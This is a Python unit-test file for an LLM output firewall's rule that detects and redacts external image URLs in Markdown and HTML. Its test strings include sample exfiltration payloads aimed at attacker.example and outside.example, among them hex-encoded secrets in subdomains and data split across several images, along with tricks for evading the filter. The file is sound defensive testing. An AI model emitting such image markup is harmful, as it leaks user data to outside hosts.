import time
import unittest

from llm_ffw import (
    AUDIT_POLICY,
    BALANCED_POLICY,
    STRICT_POLICY,
    Action,
    ExternalResourceConfig,
    ExternalResourceRule,
    Firewall,
    ProcessScannerPoolConfig,
    RuleEngine,
    RuleScanner,
    ScanScope,
    UnsafeURLConfig,
    UnsafeURLRule,
)


def _scanner(config: ExternalResourceConfig | None = None) -> RuleScanner:
    return RuleScanner(rules=(ExternalResourceRule(config),))


class ExternalResourceConfigTests(unittest.TestCase):
    def test_limits_are_bounded_integers(self) -> None:
        for field_name in (
            "max_candidates",
            "max_markup_chars",
            "max_url_chars",
        ):
            with self.subTest(field=field_name), self.assertRaises(TypeError):
                ExternalResourceConfig(**{field_name: True})  # type: ignore[arg-type]
            with self.subTest(field=field_name), self.assertRaises(ValueError):
                ExternalResourceConfig(**{field_name: 0})
        with self.assertRaises(ValueError):
            ExternalResourceConfig(max_candidates=1_025)
        with self.assertRaises(ValueError):
            ExternalResourceConfig(max_markup_chars=65_537)
        with self.assertRaises(ValueError):
            ExternalResourceConfig(max_url_chars=65_537)
        with self.assertRaisesRegex(TypeError, "opaque_path_segment_chars"):
            ExternalResourceConfig(opaque_path_segment_chars=64)  # type: ignore[call-arg]

    def test_hostname_allowlist_is_normalized_bounded_and_hidden(self) -> None:
        config = ExternalResourceConfig(
            allowed_hostnames=("CDN.Example.", "cdn.example"),
            allowed_hostname_suffixes=("Images.Example",),
        )

        self.assertEqual(config.allowed_hostnames, ("cdn.example",))
        self.assertEqual(
            config.allowed_hostname_suffixes,
            ("images.example",),
        )
        self.assertNotIn("cdn.example", repr(config))
        self.assertNotIn("images.example", repr(config))
        with self.assertRaises(TypeError):
            ExternalResourceConfig(allowed_hostnames="cdn.example")  # type: ignore[arg-type]
        with self.assertRaises(ValueError):
            ExternalResourceConfig(
                allowed_hostnames=tuple(
                    f"host-{index}.example" for index in range(1_025)
                )
            )


class ExternalResourceRuleTests(unittest.TestCase):
    def test_markdown_external_host_redacts_only_url_with_safe_metadata(self) -> None:
        url = "https://outside.example/pixel.png"
        text = f"before ![status]({url} \"preview\") after"

        finding = _scanner().scan(text, scope=ScanScope.OUTPUT)[0]

        self.assertEqual(finding.rule_id, "output.external_resource")
        self.assertEqual(finding.severity.value, "high")
        self.assertIs(finding.action, Action.REDACT)
        self.assertEqual(
            (finding.span.start, finding.span.end),
            (text.index(url), text.index(url) + len(url)),
        )
        self.assertEqual(finding.redacted_preview, "[REDACTED:external_resource]")
        self.assertEqual(
            dict(finding.metadata),
            {
                "reason": "hostname_not_allowed",
                "resource_syntax": "markdown_image",
                "scheme": "https",
                "detector": "bounded_external_resource",
                "span_basis": "characters",
            },
        )
        self.assertNotIn(url, repr(finding))
        self.assertNotIn("outside.example", repr(finding))
        self.assertEqual(
            RuleEngine(scanner=_scanner()).process(
                text, scope=ScanScope.OUTPUT
            ).processed_text,
            'before ![status]([REDACTED] "preview") after',
        )

    def test_html_quoted_unquoted_and_entities_are_detected(self) -> None:
        values = (
            '<img alt="x" src="https://outside.example/p.png?d=one">',
            "<IMG SRC='https://outside.example/p.png?d=two'>",
            "<img src=https://outside.example/p.png?d=three>",
            '<img src="https&#58;//outside.example/p.png?d=four&amp;x=1">',
        )

        for text in values:
            with self.subTest(text=text):
                finding = _scanner().scan(text, scope=ScanScope.OUTPUT)[0]
                self.assertEqual(
                    finding.metadata["resource_syntax"], "html_img_src"
                )
                self.assertEqual(
                    finding.metadata["reason"], "hostname_not_allowed"
                )

    def test_angle_nested_escaped_and_scheme_relative_markdown(self) -> None:
        values = (
            "![outer [inner]](<https://outside.example/p?d=one> 'title')",
            r"![escaped](https\://outside.example/p?d=two)",
            "![relative](//outside.example/p?d=three)",
        )

        findings = tuple(
            _scanner().scan(value, scope=ScanScope.OUTPUT)[0]
            for value in values
        )

        self.assertEqual(
            tuple(item.metadata["scheme"] for item in findings),
            ("https", "https", "scheme_relative"),
        )

    def test_commonmark_backslash_parity_controls_image_marker(self) -> None:
        url = "https://outside.example/p?d=one"

        self.assertEqual(
            _scanner().scan(rf"\![x]({url})", scope=ScanScope.OUTPUT),
            (),
        )
        self.assertEqual(
            len(_scanner().scan(rf"\\![x]({url})", scope=ScanScope.OUTPUT)),
            1,
        )

    def test_hostname_encoded_data_is_redacted_with_a_short_path(self) -> None:
        text = "![status](https://736563726574.attacker.example/a.png)"

        finding = _scanner().scan(text, scope=ScanScope.OUTPUT)[0]

        self.assertEqual(finding.metadata["reason"], "hostname_not_allowed")

    def test_multiple_images_cannot_chunk_data_across_hostnames(self) -> None:
        text = (
            "![one](https://736563.attacker.example/a.png)"
            "![two](https://726574.attacker.example/b.png)"
        )

        findings = _scanner().scan(text, scope=ScanScope.OUTPUT)

        self.assertEqual(len(findings), 2)
        self.assertEqual(
            {finding.metadata["reason"] for finding in findings},
            {"hostname_not_allowed"},
        )

    def test_exact_and_suffix_allowlists_suppress_only_matching_hosts(self) -> None:
        scanner = _scanner(
            ExternalResourceConfig(
                allowed_hostnames=("cdn.example",),
                allowed_hostname_suffixes=("assets.example",),
            )
        )
        values = (
            "![x](https://cdn.example/p.png?cache=one)",
            "![x](https://a.assets.example/" + "Ab01" * 16 + ")",
            "![x](https://notassets.example/p.png)",
        )

        self.assertEqual(scanner.scan(values[0], scope=ScanScope.OUTPUT), ())
        self.assertEqual(scanner.scan(values[1], scope=ScanScope.OUTPUT), ())
        self.assertEqual(len(scanner.scan(values[2], scope=ScanScope.OUTPUT)), 1)

    def test_ambiguous_authority_cannot_bypass_hostname_allowlist(self) -> None:
        scanner = _scanner(
            ExternalResourceConfig(allowed_hostnames=("allowed.example",))
        )
        text = r'<img src="https://outside.example\@allowed.example/p?d=one">'

        finding = scanner.scan(text, scope=ScanScope.OUTPUT)[0]

        self.assertEqual(finding.metadata["reason"], "ambiguous_authority")

    def test_malformed_external_authorities_fail_closed_without_a_query(self) -> None:
        values = (
            "![missing](https:///a.png)",
            '<img src="https://[invalid/a.png">',
        )

        for text in values:
            with self.subTest(text=text):
                finding = _scanner().scan(text, scope=ScanScope.OUTPUT)[0]
                self.assertEqual(
                    finding.metadata["reason"], "ambiguous_authority"
                )

    def test_browser_normalized_scheme_forms_cannot_bypass_detection(self) -> None:
        values = (
            '<img src="h&#x09;ttps://outside.example/p?d=one">',
            r'<img src="https:\\outside.example\p?d=two">',
        )

        for text in values:
            with self.subTest(text=text):
                finding = _scanner().scan(text, scope=ScanScope.OUTPUT)[0]
                self.assertIn(
                    finding.metadata["reason"],
                    ("hostname_not_allowed", "ambiguous_authority"),
                )

    def test_html_literal_space_is_excluded_from_url_span(self) -> None:
        url = "https://outside.example/p?d=one"
        text = f'<img src="  {url}  ">'

        finding = _scanner().scan(text, scope=ScanScope.OUTPUT)[0]

        self.assertEqual(
            (finding.span.start, finding.span.end),
            (text.index(url), text.index(url) + len(url)),
        )

    def test_non_resource_and_non_risk_text_is_preserved(self) -> None:
        values = (
            "plain output",
            "[click](https://outside.example/p?d=one)",
            "![local](/images/p.png?d=one)",
            "![data](data:image/png;base64,AAAA)",
            r"\![escaped](https://outside.example/p?d=one)",
            "![unterminated](https://outside.example/p?d=one",
            '<a href="https://outside.example/p?d=one">click</a>',
            '<img srcset="https://outside.example/p?d=one 1x">',
        )

        for text in values:
            with self.subTest(text=text):
                self.assertEqual(
                    _scanner().scan(text, scope=ScanScope.OUTPUT), ()
                )
        self.assertEqual(
            _scanner().scan(
                "![x](https://outside.example/p?d=one)",
                scope=ScanScope.INPUT,
            ),
            (),
        )

    def test_url_markup_and_candidate_limits_fail_closed(self) -> None:
        long_url = "https://outside.example/" + "a" * 40 + "?d=one"
        url_finding = _scanner(
            ExternalResourceConfig(max_url_chars=32)
        ).scan(f"![x]({long_url})", scope=ScanScope.OUTPUT)[0]
        self.assertIs(url_finding.action, Action.BLOCK)
        self.assertEqual(url_finding.metadata["reason"], "url_limit_exceeded")

        markup_finding = _scanner(
            ExternalResourceConfig(max_markup_chars=16)
        ).scan("![" + "a" * 32, scope=ScanScope.OUTPUT)[0]
        self.assertIs(markup_finding.action, Action.BLOCK)
        self.assertEqual(
            markup_finding.metadata["reason"], "markup_limit_exceeded"
        )

        unterminated = '<img src="https://outside.example/p?d=one"'
        unterminated_finding = _scanner().scan(
            unterminated, scope=ScanScope.OUTPUT
        )[0]
        self.assertIs(unterminated_finding.action, Action.BLOCK)
        self.assertEqual(
            unterminated_finding.metadata["reason"], "unterminated_markup"
        )

        first = "![a](https://one.example/p?d=one)"
        second = "![b](https://two.example/p?d=two)"
        findings = _scanner(ExternalResourceConfig(max_candidates=1)).scan(
            first + second,
            scope=ScanScope.OUTPUT,
        )
        self.assertEqual(len(findings), 2)
        self.assertIs(findings[1].action, Action.BLOCK)
        self.assertEqual(
            findings[1].metadata["reason"], "candidate_limit_exceeded"
        )

    def test_balanced_strict_and_audit_policy_semantics(self) -> None:
        text = "![x](https://outside.example/p?d=one)"
        scanner = _scanner()
        balanced = RuleEngine(scanner=scanner, policy=BALANCED_POLICY).process(
            text, scope=ScanScope.OUTPUT
        )
        strict = RuleEngine(scanner=scanner, policy=STRICT_POLICY).process(
            text, scope=ScanScope.OUTPUT
        )
        audit = RuleEngine(scanner=scanner, policy=AUDIT_POLICY).process(
            text, scope=ScanScope.OUTPUT
        )

        self.assertIs(balanced.decision, Action.REDACT)
        self.assertEqual(balanced.processed_text, "![x]([REDACTED])")
        self.assertIs(strict.decision, Action.BLOCK)
        self.assertIsNone(strict.processed_text)
        self.assertIs(audit.decision, Action.REVIEW)
        self.assertEqual(audit.processed_text, text)

    def test_composes_with_unsafe_url_without_losing_rule_ownership(self) -> None:
        text = "![x](https://outside.example/p?d=one)"
        scanner = RuleScanner(
            rules=(
                ExternalResourceRule(),
                UnsafeURLRule(
                    UnsafeURLConfig(denied_hostnames=("outside.example",))
                ),
            )
        )

        findings = scanner.scan(text, scope=ScanScope.OUTPUT)

        self.assertEqual(
            frozenset(item.rule_id for item in findings),
            frozenset(("output.external_resource", "url.unsafe")),
        )

    def test_eight_million_character_paths_are_bounded(self) -> None:
        scanner = _scanner()
        suffixes = (
            "",
            "![label] ordinary text\n" * 100_000,
            "![x](https://736563726574.attacker.example/a.png)",
            '<img src="https://outside.example/a.png">',
        )
        for suffix in suffixes:
            suffix = suffix[:8_000_000]
            text = "x" * (8_000_000 - len(suffix)) + suffix
            started = time.perf_counter()
            findings = scanner.scan(text, scope=ScanScope.OUTPUT)
            elapsed = time.perf_counter() - started

            expected = int("https://" in suffix)
            self.assertEqual(len(findings), expected)
            self.assertLess(elapsed, 2.0)


class ExternalResourceFacadeTests(unittest.TestCase):
    def test_opt_in_capability_process_propagation_and_default_absence(self) -> None:
        config = ExternalResourceConfig(
            max_candidates=7,
            max_markup_chars=1_024,
            max_url_chars=512,
            allowed_hostnames=("cdn.example",),
            allowed_hostname_suffixes=("assets.example",),
        )
        default = Firewall(
            pool_config=ProcessScannerPoolConfig(max_workers=1, max_in_flight=1)
        )
        enabled = Firewall(
            external_resource_config=config,
            pool_config=ProcessScannerPoolConfig(max_workers=1, max_in_flight=1),
        )
        text = "![x](https://outside.example/p?d=one)"

        self.assertIsNone(default.capabilities().external_resource)
        capability = enabled.capabilities().external_resource
        self.assertIsNotNone(capability)
        assert capability is not None
        self.assertEqual(capability.max_candidates, 7)
        self.assertEqual(capability.max_markup_chars, 1_024)
        self.assertEqual(capability.max_url_chars, 512)
        self.assertEqual(capability.allowed_hostname_count, 1)
        self.assertEqual(capability.allowed_hostname_suffix_count, 1)
        self.assertNotIn("cdn.example", repr(capability))
        with enabled:
            self.assertEqual(enabled.sanitize_input(text), text)
            self.assertEqual(
                enabled.sanitize_output(text),
                "![x]([REDACTED])",
            )

    def test_facade_rejects_wrong_config_type(self) -> None:
        with self.assertRaisesRegex(TypeError, "external_resource_config"):
            Firewall(external_resource_config=True)  # type: ignore[arg-type]


if __name__ == "__main__":
    unittest.main()
